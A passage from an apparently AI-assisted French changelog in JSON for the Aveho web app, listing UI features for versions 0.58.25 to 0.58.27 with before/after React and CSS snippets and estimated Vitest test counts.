          "before": "// AVANT 0.58.27 - Tooltip simple avec compteur\n<Tooltip content={`${nonLues} non lue(s)`}>\n  <button className='notif-btn' onClick={() => setOpen(!open)}>\n    <i className='ti ti-bell' />\n    {nonLues > 0 && <span className='notif-badge'>{nonLues}</span>}\n  </button>\n</Tooltip>",
          "after": "// 0.58.27 - Preview hover avec 3 dernières notifs\nconst [previewOpen, setPreviewOpen] = useState(false);\nconst previewTimerRef = useRef(null);\nconst handlePreviewEnter = () => {\n  clearTimeout(previewTimerRef.current);\n  previewTimerRef.current = setTimeout(() => setPreviewOpen(true), 350);\n};\nconst handlePreviewLeave = () => {\n  clearTimeout(previewTimerRef.current);\n  previewTimerRef.current = setTimeout(() => setPreviewOpen(false), 200);\n};\nconst lastThree = items.slice(0, 3);\n\n<div onMouseEnter={handlePreviewEnter} onMouseLeave={handlePreviewLeave}>\n  <button className='notif-btn' onClick={() => setOpen(!open)}>\n    <i className='ti ti-bell' />\n    {nonLues > 0 && <span className='notif-badge'>{nonLues}</span>}\n  </button>\n</div>\n\n{previewOpen && !open && (\n  <div className='notif-preview-panel'\n       onMouseEnter={handlePreviewEnter}\n       onMouseLeave={handlePreviewLeave}>\n    {/* Header avec compteur */}\n    <div className='preview-head'>\n      <i className='ti ti-bell' />\n      <span>Notifications</span>\n      {nonLues > 0 && <span className='badge-amber'>{nonLues} non lue(s)</span>}\n    </div>\n\n    {/* 3 derniers items avec dot non lu + icône type + relative time */}\n    {lastThree.map(it => (\n      <div onClick={() => setOpen(true)}>\n        {!it.lu && <span className='dot-unread' />}\n        <span className='type-icon'>{TYPES[it.type].ic}</span>\n        <div>\n          <div className='titre'>{it.titre}</div>\n          <div className='msg'>{it.message}</div>\n          <div className='time'>{relativeTime(it.created_at)}</div>\n        </div>\n      </div>\n    ))}\n\n    {/* Footer 'Voir tout' */}\n    <div onClick={() => setOpen(true)}>\n      Voir toutes les notifications ({items.length}) →\n    </div>\n  </div>\n)}"
        }
      },
      { "code": "UI", "txt": "🎓 TOUR PRODUIT PREMIUM SUR /accueil avec 5 STEPS CUSTOM. Utilise le nouveau composant OnboardingTour livré en 0.58.26. (a) Constante **PREMIUM_TOUR_STEPS** avec 5 étapes : Cmd+K, KPIs mission control, NotifBell preview, Mode présentation Ctrl+Shift+P, Mode focus Ctrl+Shift+F. (b) Composant **PremiumTourTrigger** qui détecte `?tour=premium` dans l'URL pour déclencher le tour (reset le storage au passage). (c) Le bouton 'Rejouer la visite' dans /profil **redirige maintenant vers `/accueil?tour=premium`** pour lancer le nouveau tour premium. (d) Le tour legacy reste actif à la première connexion (pas de breaking change)",
        "code_snippet": {
          "file": "app/accueil/page.js + app/profil/page.js",
          "note": "Tour premium 5 steps",
          "lang": "jsx",
          "before": "// AVANT 0.58.27 - bouton Rejouer relance le legacy tour basique",
          "after": "// 0.58.27 - 5 steps premium + déclenchement via URL\nimport PremiumOnboardingTour from '../components/OnboardingTour';\n\nconst PREMIUM_TOUR_STEPS = [\n  {\n    target: \".av-cmdk-trigger, [data-tour='cmdk'], .topbar input\",\n    title: '🔍 Recherche universelle Cmd+K',\n    content: 'Ctrl+K partout pour la palette. Tapez > pour les actions rapides.',\n    position: 'bottom',\n  },\n  {\n    target: '.kpi-tile, .av-conic-card',\n    title: '💫 Vos KPIs en mode mission control',\n    content: 'Scan-line conic sur les KPIs urgents.',\n    position: 'bottom',\n  },\n  {\n    target: '.notif-btn, .notif-wrap',\n    title: '🔔 Notifications avec preview',\n    content: 'Survolez la cloche pour voir les 3 dernières.',\n    position: 'bottom',\n  },\n  {\n    target: 'body',\n    title: '🎥 Mode présentation pour vos démos',\n    content: 'Ctrl+Shift+P : zoom + animations slow + ombres renforcées.',\n  },\n  {\n    target: 'body',\n    title: '🧘 Mode focus zen pour la saisie',\n    content: 'Ctrl+Shift+F : cache topbar/notifs + centre le contenu.',\n  },\n];\n\nfunction PremiumTourTrigger() {\n  const [shouldStart, setShouldStart] = useState(false);\n  useEffect(() => {\n    const params = new URLSearchParams(window.location.search);\n    if (params.get('tour') === 'premium') {\n      localStorage.removeItem('av-tour-premium-058');\n      // Nettoie l'URL\n      const url = new URL(window.location.href);\n      url.searchParams.delete('tour');\n      window.history.replaceState({}, '', url);\n      setShouldStart(true);\n    }\n  }, []);\n  if (!shouldStart) return null;\n  return (\n    <PremiumOnboardingTour\n      steps={PREMIUM_TOUR_STEPS}\n      storageKey='av-tour-premium-058'\n      autoStart={true}\n    />\n  );\n}\n\n// Dans le render :\n<OnboardingTour />          {/* legacy à la 1ère connexion */}\n<PremiumTourTrigger />      {/* premium si ?tour=premium */}\n\n// app/profil/page.js - bouton Rejouer redirige\nfunction ReplayTourButton() {\n  const router = useRouter();\n  return (\n    <NeonButton variant='blue' icon='ti-route' onClick={() => {\n      localStorage.removeItem('av-tour-premium-058');\n      router.push('/accueil?tour=premium');\n    }}>\n      Rejouer la visite guidée\n    </NeonButton>\n  );\n}"
        }
      },
      { "code": "UI", "txt": "🎨 MODE PRÉSENTATION : WATERMARK LOGO AVEHO. Quand l'utilisateur est en mode présentation (Ctrl+Shift+P), affichage d'un **watermark logo Aveho** discret en bas à droite. Opacité 0.35 par défaut, 0.55 au hover (signal que c'est un visuel discret), 0.25 sur mobile. Logo SVG inline `/public/logo-aveho.svg` créé avec gradient navy + 'v' teal qui glow. Drop-shadow pour décollement subtil",
        "code_snippet": {
          "file": "app/globals.css + public/logo-aveho.svg",
          "note": "Watermark présentation",
          "lang": "css",
          "before": "/* AVANT 0.58.27 - juste un badge texte 'MODE PRÉSENTATION' */",
          "after": "/* 0.58.27 - Watermark logo en bas à droite */\nhtml.av-presentation-mode body::before {\n  content: '';\n  position: fixed;\n  bottom: 24px;\n  right: 32px;\n  width: 120px;\n  height: 40px;\n  background-image: url('/logo-aveho.svg');\n  background-repeat: no-repeat;\n  background-position: right center;\n  background-size: contain;\n  opacity: 0.35;\n  pointer-events: none;\n  z-index: 99997;\n  filter: drop-shadow(0 2px 8px rgba(20, 33, 49, 0.40));\n  transition: opacity 200ms;\n}\nhtml.av-presentation-mode body:hover::before {\n  opacity: 0.55;\n}\n@media (max-width: 768px) {\n  html.av-presentation-mode body::before {\n    width: 80px; height: 28px;\n    bottom: 16px; right: 16px;\n    opacity: 0.25;\n  }\n}\n\n/* public/logo-aveho.svg (NEW)\n   SVG inline avec texte 'aveho' :\n   - 'a' / 'eho' en navy gradient\n   - 'v' en teal avec filter glow\n   - Quicksand-like font-family */"
        }
      },
      { "code": "UI", "txt": "⚡ CMD+K : PREVIEW PANEL POUR LE RÉSULTAT SÉLECTIONNÉ. Refonte du layout résultats : passage de `flex column` à **`flex row`** avec liste à gauche + **panel preview à droite (280px)** pour le résultat hoveré/sélectionné. Le preview montre : (a) Eyebrow 'Aperçu Type' avec icône et couleur du type. (b) Titre en grand. (c) Sous-titre détaillé. (d) Métadonnées additionnelles si `r.meta` présent (loop over Object.entries). (e) **CTA 'Appuyez sur ↵ pour ouvrir'** avec gradient et border colorée selon le type. Animation `av-cmdk-preview-in` (slide depuis la droite). Donne du contexte sans avoir à cliquer",
        "code_snippet": {
          "file": "app/GlobalSearch.js",
          "note": "Preview side panel",
          "lang": "jsx",
          "before": "// AVANT 0.58.27 - Liste simple en colonne unique\n<div>\n  {results.map((r, i) => (\n    <div onClick={() => router.push(r.href)}>\n      <Icon /> <Title /> <TypeBadge />\n    </div>\n  ))}\n</div>",
          "after": "// 0.58.27 - Layout flex avec liste + preview panel\n<div style={{ display: 'flex', gap: 0 }}>\n  <div style={{ flex: 1 }}>\n    {results.map((r, i) => (\n      <div onClick={() => router.push(r.href)} onMouseEnter={() => setSel(i)}>\n        <Icon /> <Title /> <TypeBadge />\n      </div>\n    ))}\n  </div>\n\n  {/* Preview panel à droite */}\n  {results[sel] && (\n    <div style={{\n      width: 280,\n      borderLeft: '1px solid rgba(124,200,200,.15)',\n      background: 'linear-gradient(180deg, rgba(20,33,49,.50), rgba(13,24,34,.50))',\n      animation: 'av-cmdk-preview-in 200ms',\n    }}>\n      {/* Eyebrow type */}\n      <div className='preview-eyebrow' style={{ color: t.color }}>\n        <i className={t.icon} /> Aperçu {t.lbl}\n      </div>\n\n      {/* Titre + sub */}\n      <div className='preview-title'>{r.titre}</div>\n      {r.sub && <div className='preview-sub'>{r.sub}</div>}\n\n      {/* Métadonnées additionnelles */}\n      {r.meta && (\n        <div className='preview-meta'>\n          {Object.entries(r.meta).map(([k, v]) => (\n            <div key={k}>\n              <span>{k}:</span> <b>{v}</b>\n            </div>\n          ))}\n        </div>\n      )}\n\n      {/* CTA */}\n      <div style={{\n        background: `linear-gradient(135deg, ${t.color}33, ${t.color}11)`,\n        border: `1px solid ${t.color}44`,\n        color: t.color,\n      }}>\n        <i className='ti ti-arrow-right' />\n        Appuyez sur ↵ pour ouvrir\n      </div>\n    </div>\n  )}\n</div>"
        }
      },
      { "code": "AI", "txt": "+24 tests Vitest (v058-27-bundle.test.js) : version+SW (2), NotifBell preview (6 — state + handlers + delays + slice 3 + footer + keyframe + dot non lu), Tour premium /accueil (5 — import + 5 steps + content + trigger + storageKey), ReplayTourButton premium (2 — ?tour=premium + reset storage), Watermark logo (3 — SVG exists + CSS body::before + opacities), Cmd+K preview (4 — layout flex + eyebrow + CTA + animation + meta). Total **~4078 verts estimés** (build/test à exécuter en local — sandbox npm bloqué)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.27 : 4 chantiers WOW UX² livrés. Hover sur la cloche montre les 3 dernières notifs sans clic — gain de temps massif au quotidien. Tour produit premium intégré sur /accueil avec déclencheur URL + bouton Rejouer dans /profil. Mode présentation gagne un watermark Aveho élégant pour les démos clients. Cmd+K affiche un preview enrichi du résultat sélectionné pour confirmer avant d'ouvrir. PROCHAINES PISTES POSSIBLES (0.58.28) : (a) **Dashboard widgets configurables drag & drop** (gros chantier, le seul restant des 7 initiaux). (b) **Skeleton appliqué** sur /parametres et /profil (TabPanel loading). (c) **Animation des KpiCard ConicCard** : transition value avec counter animé de 0 à la valeur. (d) **Cmd+K résultats : aperçu d'image** pour les matériels avec photo. (e) **Mode présentation : raccourcis clavier visuels** (afficher Ctrl+Shift+P en bas pendant le mode). (f) **NotifBell preview : marquer comme lu inline** depuis le preview" }
    ],
    "themes": ["ui", "wow", "ux", "onboarding"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.27.html",
    "sqlFile": null
  },
  {
    "v": "0.58.26",
    "kind": "version",
    "titre": "🎯 BUNDLE WOW : Toggle Mode Focus dans /profil + ParticlesBackground cosmic + OnboardingTour premium + Rejouer visite + Skeleton TabPanel",
    "chantiers": [
      { "code": "UI", "txt": "🧘 TOGGLE MODE FOCUS DANS /profil. (a) Nouveau panel vert 'Mode focus zen' dans l'onglet Sécurité, juste après le panel Mode présentation. (b) Composant **FocusModeToggle** qui : sync l'état initial via `isFocusMode()`, écoute l'event `av-focus-mode-change` (sync avec le shortcut Ctrl+Shift+F), bascule entre NeonButton variant=**teal** icon=ti-target (off) et variant=**amber** icon=ti-target-off (on). (c) Mention raccourci Ctrl+Shift+F / Cmd+Shift+F. Symétrique au toggle Mode Présentation livré en 0.58.24",
        "code_snippet": {
          "file": "app/profil/page.js",
          "note": "Toggle UI + sync state",
          "lang": "jsx",
          "before": "// AVANT 0.58.26 - Mode focus uniquement via raccourci",
          "after": "// 0.58.26 - Toggle visible dans /profil\nimport { isFocusMode, toggleFocusMode } from '../../lib/focusMode';\n\nfunction FocusModeToggle() {\n  const [isOn, setIsOn] = useState(false);\n  useEffect(() => {\n    setIsOn(isFocusMode());\n    function onChange(e) {\n      setIsOn(e?.detail?.on ?? isFocusMode());\n    }\n    window.addEventListener('av-focus-mode-change', onChange);\n    return () => window.removeEventListener('av-focus-mode-change', onChange);\n  }, []);\n  return (\n    <NeonButton\n      variant={isOn ? 'amber' : 'teal'}\n      icon={isOn ? 'ti-target-off' : 'ti-target'}\n      onClick={() => setIsOn(toggleFocusMode())}\n    >\n      {isOn ? 'Désactiver le mode focus' : 'Activer le mode focus zen'}\n    </NeonButton>\n  );\n}\n\n// Dans /profil onglet Sécurité, après le panel Mode présentation :\n<Panel style={{ borderLeft: '4px solid #5aa05a' }}>\n  <h2>🎯 Mode focus zen</h2>\n  <p>Pour les sessions de saisie concentrée : cache topbar/sidebar/notifs...</p>\n  <FocusModeToggle />\n  <p>💡 Raccourci : <kbd>Ctrl+Shift+F</kbd></p>\n</Panel>"
        }
      },
      { "code": "UI", "txt": "🌌 PARTICLESBACKGROUND MODE COSMIC SUR /accueil. La page d'accueil passe en mode **multicolor** (palette Aveho cyclant : teal → blue → violet → terra). Effet 'cosmic' : 40 particules avec connexions, chaque particule a sa propre couleur dans la palette. Speed légèrement réduit (0.25 vs 0.3) pour rendre l'animation plus calme et hypnotique. linkDistance 150 (vs 140) pour plus de liens visibles",
        "code_snippet": {
          "file": "app/accueil/page.js",
          "note": "Cosmic mode",
          "lang": "jsx",
          "before": "// AVANT 0.58.26 - particules teal monochrome\n<ParticlesBackground count={30} speed={0.3} linkDistance={140} />",
          "after": "// 0.58.26 - mode cosmic multicolor\n<ParticlesBackground\n  count={40}\n  speed={0.25}\n  linkDistance={150}\n  mode='multicolor'   // ← palette Aveho cyclant : teal → blue → violet → terra\n/>"
        }
      },
      { "code": "UI", "txt": "🎓 ONBOARDINGTOUR PREMIUM (nouveau composant). Création d'un composant **app/components/OnboardingTour.js** premium et réutilisable (sans dépendance externe — Driver.js aurait ajouté +50KB). Features : (a) **Overlay SVG mask** semi-transparent avec spot lumineux sur l'élément ciblé + ring teal avec drop-shadow glow. (b) **Popover positionné automatiquement** (top/bottom/left/right via prop position). (c) **Smooth scroll** vers la cible si hors viewport. (d) **Progress dots** animés (dot actif grandit + glow). (e) **Navigation Suivant/Précédent/Passer** avec NeonButton-style gradient teal→blue. (f) **Persistance localStorage** : ne se relance pas si déjà vu. (g) **Rendu via Portal** (échappe aux containing blocks). (h) Keyframes `av-tour-overlay-in` + `av-tour-popover-in` pour animation entrée. **L'ancien OnboardingTour legacy reste actif** sur /accueil (pas de breaking change)",
        "code_snippet": {
          "file": "app/components/OnboardingTour.js (NEW) + globals.css",
          "note": "Tour premium maison",
          "lang": "jsx",
          "before": "// AVANT 0.58.26 - aucun composant tour premium réutilisable\n// (l'ancien OnboardingTour fonctionne mais est moins extensible)",
          "after": "// 0.58.26 - app/components/OnboardingTour.js (NEW)\nimport OnboardingTour from '@/components/OnboardingTour';\n\nconst steps = [\n  {\n    target: '#topbar-menu',\n    title: 'Le menu principal',\n    content: 'Naviguez entre les sections de l\\'app...',\n    position: 'bottom',\n  },\n  {\n    target: '.kpi-tile:first-child',\n    title: 'Vos KPIs',\n    content: 'Les indicateurs clés de votre activité.',\n    position: 'right',\n  },\n  {\n    target: '#cmdk-trigger',\n    title: 'Recherche rapide',\n    content: 'Appuyez sur Ctrl+K pour ouvrir la palette de recherche partout dans l\\'app.',\n    position: 'left',\n  },\n];\n\n<OnboardingTour\n  steps={steps}\n  storageKey='av-tour-accueil'  // ne se relance pas si déjà vu\n  autoStart={true}\n  onComplete={() => console.log('Tour terminé')}\n  onSkip={() => console.log('Tour passé')}\n/>\n\n// Features :\n// - SVG mask spotlight sur la cible\n// - Ring teal avec drop-shadow glow\n// - Popover positionné auto (top/bottom/left/right)\n// - Smooth scroll vers la cible si hors viewport\n// - Progress dots animés\n// - Navigation Suivant/Précédent/Passer\n// - Persistance localStorage\n// - Rendu via Portal\n\n/* CSS */\n@keyframes av-tour-overlay-in {\n  from { opacity: 0; }\n  to   { opacity: 1; }\n}\n@keyframes av-tour-popover-in {\n  from { opacity: 0; transform: scale(0.95) translateY(-4px); }\n  to   { opacity: 1; transform: scale(1) translateY(0); }\n}"
        }
      },
      { "code": "UI", "txt": "🔁 BOUTON 'REJOUER LA VISITE GUIDÉE' DANS /profil. Nouveau panel bleu 'Visite guidée' dans l'onglet Sécurité (après les toggles mode présentation/focus). Composant **ReplayTourButton** qui : appelle `resetOnboarding()` du legacy + clear `av-onboarding`, puis redirige vers /accueil où le tour démarre automatiquement. NeonButton variant=blue icon=ti-route 'Rejouer la visite guidée'",
        "code_snippet": {
          "file": "app/profil/page.js",
          "note": "Replay tour",
          "lang": "jsx",
          "before": "// AVANT 0.58.26 - tour seulement à la première connexion",
          "after": "// 0.58.26 - bouton Rejouer\nimport { resetOnboarding } from '../OnboardingTour';\nimport { useRouter } from 'next/navigation';\n\nfunction ReplayTourButton() {\n  const router = useRouter();\n  function handleReplay() {\n    resetOnboarding();  // helper existant\n    try { localStorage.removeItem('av-onboarding'); } catch {}\n    router.push('/accueil');  // démarre auto à l'arrivée\n  }\n  return (\n    <NeonButton variant='blue' icon='ti-route' onClick={handleReplay}>\n      Rejouer la visite guidée\n    </NeonButton>\n  );\n}\n\n<Panel style={{ borderLeft: '4px solid #185FA5' }}>\n  <h2>🛣 Visite guidée</h2>\n  <p>Vous voulez (re)découvrir les fonctionnalités principales ?</p>\n  <ReplayTourButton />\n</Panel>"
        }
      },
      { "code": "UI", "txt": "💀 SKELETON PREMIUM DANS TABPANEL. Le composant **TabPanel** reçoit une prop **`loading = false`**. Quand `loading=true`, affiche automatiquement un **TabPanelSkeleton** avec : (a) header skel (titre 45% + sous-titre 70%), (b) form-like : 3 paires label (120px) + input (100% × 36px arrondi 8), (c) grid 2 mini-KPI cards skel, (d) footer 2 boutons skel (110×36 + 90×36). Animation shimmer `av-skel-line` héritée du Drawer Skeleton (0.58.22). Pratique pour montrer un chargement quand on switch d'onglet et que le contenu charge async",
        "code_snippet": {
          "file": "app/components/ui-premium/Tabs.js",
          "note": "TabPanel loading prop",
          "lang": "jsx",
          "before": "// AVANT 0.58.26\nexport function TabPanel({ active, id, children }) {\n  return <div key={active}>{children}</div>;\n}",
          "after": "// 0.58.26 - prop loading + TabPanelSkeleton\nexport function TabPanel({ active, id, children, loading = false }) {\n  return (\n    <div key={active}>\n      {loading ? <TabPanelSkeleton /> : children}\n    </div>\n  );\n}\n\nfunction TabPanelSkeleton() {\n  return (\n    <div>\n      {/* Header */}\n      <div className='av-skel-line' style={{ width: '45%', height: 24 }} />\n      <div className='av-skel-line' style={{ width: '70%', height: 13 }} />\n\n      {/* 3 fields */}\n      {[0, 1, 2].map(i => (\n        <div key={i}>\n          <div className='av-skel-line' style={{ width: 120, height: 10 }} />\n          <div className='av-skel-line' style={{ width: '100%', height: 36 }} />\n        </div>\n      ))}\n\n      {/* Grid 2 mini-cards */}\n      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>\n        {[0, 1].map(i => (\n          <div className='skel-mini-card'>\n            <div className='av-skel-line' style={{ width: 80, height: 10 }} />\n            <div className='av-skel-line' style={{ width: '60%', height: 22 }} />\n          </div>\n        ))}\n      </div>\n\n      {/* 2 buttons footer */}\n      <div className='av-skel-line' style={{ width: 110, height: 36 }} />\n      <div className='av-skel-line' style={{ width: 90, height: 36 }} />\n    </div>\n  );\n}\n\n// Usage :\n<TabPanel active='general' loading={loadingTab}>\n  <RealContent />\n</TabPanel>"
        }
      },
      { "code": "AI", "txt": "+22 tests Vitest (v058-26-bundle.test.js) : version+SW (2), Toggle Focus profil (6 — import + composant + event sync + NeonButton + panel + Ctrl+Shift+F), Particles cosmic /accueil (1 — mode multicolor), OnboardingTour component (6 — existence + props + Portal + SVG mask + navigation + keyframes), Bouton Rejouer (4 — composant + resetOnboarding + router push + panel bleu), Skeleton TabPanel (4 — prop loading + render conditionnel + composant + structure). Total **~4054 verts estimés** (build/test à exécuter en local — sandbox npm bloqué)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.26 : 5 chantiers WOW livrés. Mode focus zen + Mode présentation désormais togglables visuellement dans /profil (en plus des raccourcis clavier). ParticlesBackground en mode cosmic sur /accueil pour effet 'spatial' immersif. Nouveau composant **OnboardingTour** premium et réutilisable, prêt pour des tours spécifiques par page. Bouton 'Rejouer la visite guidée' dans /profil pour les utilisateurs qui veulent (re)découvrir l'app. Skeleton premium intégré dans TabPanel pour des transitions élégantes. PROCHAINES PISTES POSSIBLES (0.58.27) : (a) **Notification badges premium avec preview hover** sur NotifBell (tooltip enrichi 3 dernières notifs). (b) **Dashboard widgets configurables drag & drop** (gros chantier). (c) **Cmd+K résultats search avec preview hover** sur la card. (d) **Tour produit personnalisé /accueil** avec steps custom utilisant le nouveau OnboardingTour. (e) **Skeleton appliqué** dans /parametres et /profil (qui utilisent les Tabs lourdement)" }
    ],
    "themes": ["ui", "wow", "design-system", "ux", "onboarding"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.26.html",
    "sqlFile": null
  },
  {
    "v": "0.58.25",
    "kind": "version",
    "titre": "🚀 BUNDLE WOW XL : NeonButton 3 pages + Cmd+K contextuel + Mode focus zen + Particles multicolor/flow + /historique timeline premium",
    "chantiers": [
      { "code": "UI", "txt": "🔄 MIGRATION NEONBUTTON sur 3 pages restantes. (a) **/parametres** : 'Enregistrer les préférences' → NeonButton variant=**navy** icon=ti-device-floppy. (b) **/maintenance** : 4 boutons en variant=**blue** — 'Planifier une maintenance' (ti-plus) + 'Enregistrer' modal (ti-device-floppy + spinner busy) + 'Enregistrer' récurrence + 'Nouvelle récurrence' (ti-plus). (c) **/consentements** : bouton 'Archiver/Désarchiver' en NeonButton **dynamique** variant=amber/teal selon état. Total cumulé : **20 NeonButton sur 10 pages** depuis 0.58.21" },
      { "code": "UI", "txt": "⚡ CMD+K ACTIONS CONTEXTUELLES selon page courante. (a) Import **`usePathname()`** dans GlobalSearch.js. (b) Chaque ACTION reçoit une prop **`pageContext`** (regex matching l'URL). Ex : `new-patient` → `/^\\/patients/`, `new-achat` → `/^\\/(achats|commandes)/`. (c) **findActions(query, currentPath)** trie les actions matching la page en priorité. Si query vide + page connue → affiche directement les actions contextuelles. (d) **+3 nouvelles actions** : `toggle-presentation` (Ctrl+Shift+P), `toggle-focus` (Ctrl+Shift+F), `goto-historique`. **15 actions au total**. (e) Handler `onClick` spécial pour les URLs `#toggle-presentation` et `#toggle-focus` qui appellent les fonctions sans navigation",
        "code_snippet": {
          "file": "app/GlobalSearch.js",
          "note": "Actions contextuelles selon page",
          "lang": "jsx",
          "before": "// AVANT 0.58.25 - actions globales (même partout)\nconst ACTIONS = [\n  { id: 'new-patient', lbl: 'Créer un patient', ... },\n  { id: 'goto-stats', lbl: 'Statistiques', ... },\n  // ...\n];\n\nfunction findActions(query) {\n  // Filter par keywords seulement\n  return ACTIONS.filter(a => match(a, query)).slice(0, 6);\n}",
          "after": "// 0.58.25 - actions contextuelles + 3 nouvelles\nimport { usePathname } from 'next/navigation';\n\nconst ACTIONS = [\n  { id: 'new-patient', ..., pageContext: /^\\/patients/ },\n  { id: 'new-achat', ..., pageContext: /^\\/(achats|commandes)/ },\n  { id: 'goto-stats', ..., pageContext: /^\\/statistiques/ },\n  // NOUVELLES :\n  { id: 'toggle-presentation', url: '#toggle-presentation',\n    keywords: ['présentation', 'démo'] },\n  { id: 'toggle-focus', url: '#toggle-focus',\n    keywords: ['focus', 'zen', 'concentration'] },\n  { id: 'goto-historique', url: '/historique',\n    pageContext: /^\\/historique/ },\n];\n\nfunction findActions(query, currentPath) {\n  // Pas de query + page connue → actions contextuelles direct\n  if (!query && currentPath) {\n    return ACTIONS.filter(a =>\n      a.pageContext && a.pageContext.test(currentPath)\n    ).slice(0, 4);\n  }\n  // Sinon, filtre + tri par priorité contextuelle\n  const matches = ACTIONS.filter(a => match(a, query));\n  if (currentPath) {\n    matches.sort((a, b) => {\n      const aMatch = a.pageContext?.test(currentPath) ? 1 : 0;\n      const bMatch = b.pageContext?.test(currentPath) ? 1 : 0;\n      return bMatch - aMatch;\n    });\n  }\n  return matches.slice(0, 6);\n}\n\n// Dans le composant :\nconst pathname = usePathname();\nconst matchingActions = findActions(q, pathname);\n\n// Handler spécial pour les actions toggle (sans navigation)\nonClick={async () => {\n  if (a.url === '#toggle-presentation') {\n    const { togglePresentationMode } = await import('../lib/presentationMode');\n    togglePresentationMode();\n    setOpen(false);\n    return;\n  }\n  if (a.url === '#toggle-focus') {\n    const { toggleFocusMode } = await import('../lib/focusMode');\n    toggleFocusMode();\n    setOpen(false);\n    return;\n  }\n  router.push(a.url);\n}}"
        }
      },
      { "code": "UI", "txt": "🧘 MODE FOCUS ZEN pour saisie concentrée. (a) Nouveau module **lib/focusMode.js** avec 4 fonctions (isFocusMode, setFocusMode, toggleFocusMode, initFocusMode). State persisté dans localStorage `av-focus-mode`. (b) **Raccourci Ctrl+Shift+F** ajouté dans PresentationModeBoot. Toast feedback success/info. (c) **CSS html.av-focus-mode** : cache topbar + menu-drawer + sidebar + notif-badges + alert-banners + toast-container. Atténue breadcrumbs/version-badge (opacity 0.3 → 1 au hover). Centre/maximise le contenu (max-width 800px). (d) **Badge 'FOCUS ZEN' fixé top-right** vert, discret (opacity 0.7 → 1 au hover) avec mention 'Ctrl+Shift+F pour quitter'",
        "code_snippet": {
          "file": "lib/focusMode.js + app/PresentationModeBoot.js + globals.css",
          "note": "Mode focus zen",
          "lang": "jsx",
          "before": "// AVANT 0.58.25 - pas de mode focus",
          "after": "// 0.58.25 - lib/focusMode.js\nexport function toggleFocusMode() {\n  const next = !isFocusMode();\n  setFocusMode(next);\n  return next;\n}\n\nfunction applyMode(on) {\n  const html = document.documentElement;\n  if (on) html.classList.add('av-focus-mode');\n  else html.classList.remove('av-focus-mode');\n  window.dispatchEvent(new CustomEvent('av-focus-mode-change', { detail: { on } }));\n}\n\n// PresentationModeBoot écoute Ctrl+Shift+F en plus de Ctrl+Shift+P\nif (cmd && e.shiftKey && (e.key === 'F' || e.key === 'f')) {\n  e.preventDefault();\n  const next = toggleFocusMode();\n  toast.success('🧘 Mode focus activé', '...');\n}\n\n/* CSS */\nhtml.av-focus-mode .topbar,\nhtml.av-focus-mode .menu-drawer,\nhtml.av-focus-mode .sidebar,\nhtml.av-focus-mode [data-notif-badge],\nhtml.av-focus-mode .alert-banner {\n  display: none !important;\n}\nhtml.av-focus-mode .wrap {\n  max-width: 800px !important;\n  margin: 0 auto !important;\n}\nhtml.av-focus-mode::before {\n  content: '🧘 FOCUS ZEN — Ctrl+Shift+F pour quitter';\n  position: fixed; top: 12px; right: 16px;\n  background: linear-gradient(135deg, #5aa05a, #4a8f4a);\n  /* ... */\n}\n\n// Cmd+K : 'mode focus' ou 'concentration' affiche l'action"
        }
      },
      { "code": "UI", "txt": "✨ PARTICLESBACKGROUND : modes **multicolor** + **flow**. (a) Nouveau prop **`mode`** : 'default' | 'multicolor' | 'flow'. (b) Mode **multicolor** : chaque particule a sa propre couleur dédiée parmi la palette Aveho [teal, blue, violet, terra] cyclant par index. (c) Mode **flow** : drift directionnel au lieu de bounce, avec wrap-around (les particules réapparaissent de l'autre côté). Prop **`flowDirection`** : 'right' | 'down' | 'diagonal'. Idéal pour des effets 'rivière de données' en background",
        "code_snippet": {
          "file": "app/components/ui-premium/ParticlesBackground.js",
          "note": "Modes multicolor + flow",
          "lang": "jsx",
          "before": "// AVANT 0.58.25 - 1 seule couleur + bounce\n<ParticlesBackground count={30} color='rgba(124,200,200,.6)' />",
          "after": "// 0.58.25 - multicolor + flow directionnel\nconst MULTICOLORS = [\n  'rgba(124, 200, 200, 0.65)',  // teal\n  'rgba(24, 95, 165, 0.55)',    // blue\n  'rgba(122, 111, 176, 0.55)',  // violet\n  'rgba(201, 134, 127, 0.55)',  // terra\n];\n\n// Init : chaque particule reçoit sa couleur en multicolor\nparticles = Array.from({ length: count }, (_, i) => ({\n  // ...\n  c: mode === 'multicolor' ? MULTICOLORS[i % MULTICOLORS.length] : null,\n}));\n\n// Update : mode flow → wrap-around au lieu de bounce\nif (mode === 'flow') {\n  if (p.x > width + 10) p.x = -10;\n  if (p.y > height + 10) p.y = -10;\n} else {\n  // bounce classique\n}\n\n// Draw : multicolor utilise p.c\nif (mode === 'multicolor') {\n  for (const p of particles) {\n    ctx.fillStyle = p.c;\n    // ...\n  }\n}\n\n// Usage :\n<ParticlesBackground mode='multicolor' count={40} />\n<ParticlesBackground mode='flow' flowDirection='diagonal' count={30} />\n<ParticlesBackground mode='flow' flowDirection='right' count={50} />  /* rivière */"
        }
      },
      { "code": "UI", "txt": "📜 PAGE /historique : VUE TIMELINE PREMIUM. Refonte complète de la page Historique avec **toggle Tableau ⇄ Timeline** (timeline par défaut, plus visuel). (a) **HistoriqueTimeline** : composant qui groupe les events par jour. (b) Chaque jour a un header pill noir avec compteur d'actions + label intelligent ('Aujourd'hui', 'Hier', 'Lundi 3 juin'…). (c) **Pastilles colorées par action** (icône Tabler + couleur métier) avec halo, posées sur la ligne verticale gauche. (d) **Cards events** avec border-left coloré (rouge clair pour suppressions), hover lift + glow contextuel. (e) **Avatar utilisateur** avec initiales + couleur hashée depuis l'email (palette Aveho). (f) **Animation stagger** : chaque item apparaît 0.04s après le précédent. (g) **ACTION_ICON** : 7 mappings (creer ti-plus, modifier ti-edit, supprimer ti-trash, valider ti-circle-check, recevoir ti-package, inviter ti-user-plus, connexion ti-login). (h) EmptyState illustration=search remplace StateMsg",
        "code_snippet": {
          "file": "app/historique/page.js",
          "note": "Timeline premium",
          "lang": "jsx",
          "before": "// AVANT 0.58.25 - tableau HTML brut\n<table>\n  <thead><tr><th>Date</th><th>User</th><th>Action</th>...</tr></thead>\n  <tbody>\n    {rows.map(r => <tr>...</tr>)}\n  </tbody>\n</table>",
